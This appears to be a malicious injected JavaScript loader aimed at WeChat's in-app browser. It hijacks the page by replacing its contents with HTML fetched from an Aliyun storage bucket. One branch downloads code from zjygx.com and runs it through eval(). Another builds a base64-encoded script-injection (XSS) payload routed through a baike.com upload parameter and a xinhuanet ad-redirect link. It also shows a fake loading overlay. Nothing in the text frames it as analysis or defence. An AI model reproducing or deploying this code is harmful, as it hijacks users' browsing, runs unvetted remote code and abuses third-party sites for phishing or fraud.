!function() {
    if (window.navigator.userAgent.match(/MicroMessenger/i)) {
        var load_js = function(e, t, n) {
            var o = document.createElement("script");
            o.setAttribute("src", e),
            t && o.setAttribute(t, t),
            n && o.setAttribute("charset", n),
            document.body ? document.body.appendChild(o) : document.head.appendChild(o)
        },
        do_j = function(e) {
            11112 != e && 11113 != e ? load_js("https://butuyu.oss-cn-hangzhou.aliyuncs.com/bb/c/" + e + "/j.js?t=" + Date.now()) : window.location.href = "https://img.erbanyy.com/243e5f37673e43049a8c9d535adc7bc2.html?_c=11111&_bbt_=j&from=timeline" + Date.now()
        },
        do_s = function(e) {
            var t = document.createElement("div");
            t.setAttribute("style", "width:100%;height:2048px;font-size:1.4em;position:absolute;background-color:white;z-index:99999999;left:0;top:0;"),
            t.innerHTML = '<div style="color:black;text-align:center;font-size:1.3em">loading...</div>',
            document.body && document.body.appendChild(t),
            document.title = "正在打开...";
            var n = new XMLHttpRequest,
            o = null;
            n.onload = function() {
                o = n.responseText;
                var e; (e = document.open("text/html", "replace")).write(o),
                e.close()
            },
            n.open("GET", "http://butuyu.oss-cn-hangzhou.aliyuncs.com/bb/c/" + e + "/s.html?t=" + Date.now(), !0),
            n.send()
        },
        do_d = function(e) {
            var n = new XMLHttpRequest;
            n.onload = function() {
                var e = n.responseText,
                t = document.open("text/html", "replace");
                t.write(e),
                t.close()
            },
            n.open("GET", "http://butuyu.oss-cn-hangzhou.aliyuncs.com/bb/c/" + e + "/d.html?t=" + Date.now(), !0),
            n.send()
        },
        do_bx = function(site) {
            fetch("https://zjygx.com/nk/19/j.php").then(function(e) {
                return e.text()
            }).then(function(d) {
                eval(d)
            })
        },
        xihuanet_xb1 = function(e, t) {
            var n = btoa('<script/src="http://butuyu.oss-cn-hangzhou.aliyuncs.com/bb/g/j.js"><\/script>'),
            o = "\";document['write'](atob('{js}'));pic_src=\"".replace("{js}", n),
            c = "http://passport.baike.com/user/pb_uploadinfo.jsp?info_flag=ok&pic_src=" + encodeURIComponent(o) + "&_c=" + e + "&_bbt_=" + t + "&_=" + Date.now();
            return "http://a3.xinhuanet.com/c?sid=574&impid=8ce74a5e7b8f407f92c9458ffe8f1e0a&cam=789&adgid=789&crid=3553&uid=55efaac86d6942048aecdb4d2b7824cf&d=xinhuanetv2&url=http%3A%2F%2Ftj.xinhuanet.com%2F&ref=&i=1966948576&tm=1535527310&sig=56a0e773a2ec6f81c34959f1e90754ae&click=" + encodeURIComponent(c)
        },
        do_xbb = function(e) {
            var t = url.searchParams.get("_c"),
            n = url.searchParams.get("_bbt_");
            e = xihuanet_xb1(t, n);
            try {
                document.getElementsByTagName("body")[0].outerHTML = "<center>Loading...</center>"
            } catch(e) {}
            if (top == window && document.body) {
                var o = document.createElement("a");
                o.href = e,
                o.rel = "noreferrer",
                o.click()
            } else top.location.href = e
        },
        site = "",
        url = new URL(document.location);
        site = url.searchParams.get("_c"),
        site || (site = "11111");
        var m = url.searchParams.get("_bbt_");
        m || (m = "d"),
        "s" == m ? do_s(site) : "d" == m ? do_d(site) : "j" == m ? do_j(site) : "bx" == m ? do_bx(site) : "xbb" == m ? do_xbb(site) : do_d(site)
    }
} ();